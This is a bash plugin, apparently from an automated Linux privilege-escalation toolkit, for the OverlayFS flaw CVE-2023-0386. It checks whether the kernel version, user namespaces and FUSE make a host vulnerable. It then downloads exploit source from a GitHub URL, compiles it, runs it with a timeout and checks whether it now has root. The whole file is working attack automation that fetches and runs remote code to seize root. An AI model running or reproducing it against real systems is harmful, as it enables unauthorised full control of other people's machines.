#!/bin/bash
# OverlayFS (CVE-2023-0386) Plugin
PLUGIN_NAME="overlayfs"
PLUGIN_VERSION="1.0.0"
PLUGIN_CVE="CVE-2023-0386"
PLUGIN_DESCRIPTION="OverlayFS FUSE Local Privilege Escalation"

overlayfs_detect() {
    log_message "Checking for OverlayFS vulnerability..." "INFO"
    
    # Check for user namespaces
    if [ -f "/proc/sys/kernel/unprivileged_userns_clone" ]; then
        local userns
        userns=$(cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null)
        if [ "$userns" != "1" ]; then
            log_message "User namespaces disabled" "INFO"
            return 1
        fi
    fi
    
    # Check for FUSE
    if ! command_exists fusermount && ! command_exists fusermount3; then
        log_message "FUSE not available" "INFO"
        return 1
    fi
    
    local major=$KERNEL_MAJOR
    local minor=$KERNEL_MINOR
    local patch=$KERNEL_PATCH
    
    if [ "$major" -eq 5 ]; then
        if [ "$minor" -ge 11 ] && [ "$minor" -lt 19 ]; then
            log_message "System VULNERABLE to OverlayFS" "WARNING"
            return 0
        elif [ "$minor" -eq 19 ] && [ "$patch" -lt 2 ]; then
            log_message "System VULNERABLE to OverlayFS" "WARNING"
            return 0
        fi
    elif [ "$major" -eq 6 ] && [ "$minor" -lt 2 ]; then
        log_message "System VULNERABLE to OverlayFS" "WARNING"
        return 0
    fi
    
    log_message "System NOT vulnerable to OverlayFS" "INFO"
    return 1
}

overlayfs_exploit() {
    log_message "Attempting OverlayFS exploitation..." "INFO"
    
    if ! overlayfs_detect; then
        return 1
    fi
    
    local exploit_source="${EXPLOIT_DIR}/overlayfs.c"
    local exploit_binary="${EXPLOIT_DIR}/overlayfs"
    local exploit_url="${EXPLOIT_SOURCES[overlayfs]}"
    
    [ -z "$exploit_url" ] && exploit_url="https://raw.githubusercontent.com/xkaneiki/CVE-2023-0386/main/exploit.c"
    
    if ! download_exploit "overlayfs" "$exploit_url" "$exploit_source"; then
        log_message "Failed to download OverlayFS exploit" "WARNING"
        return 1
    fi
    
    if ! compile_exploit "$exploit_source" "$exploit_binary"; then
        log_message "Failed to compile OverlayFS exploit" "WARNING"
        return 1
    fi
    
    local work_dir="${EXPLOIT_DIR}/overlayfs_work"
    mkdir -p "$work_dir"
    
    log_message "Running OverlayFS exploit..." "INFO"
    cd "$work_dir" || return 1
    timeout_exec $TIMEOUT_CRITICAL "$exploit_binary" &
    spinner $!
    wait $! 2>/dev/null
    cd - >/dev/null || true
    
    sleep 2
    if [ "$(id -u)" -eq 0 ]; then
        log_message "OverlayFS exploit SUCCESSFUL!" "SUCCESS"
        return 0
    fi
    
    log_message "OverlayFS exploit failed" "WARNING"
    return 1
}

overlayfs_info() {
    cat << 'EOFINFO'
OverlayFS (CVE-2023-0386)
=========================
A vulnerability in OverlayFS that allows unprivileged users to
escalate privileges via user namespaces and FUSE filesystem.

Affected: Linux kernel 5.11 - 6.2
Impact: Local privilege escalation to root
Discovery: Unknown
EOFINFO
}
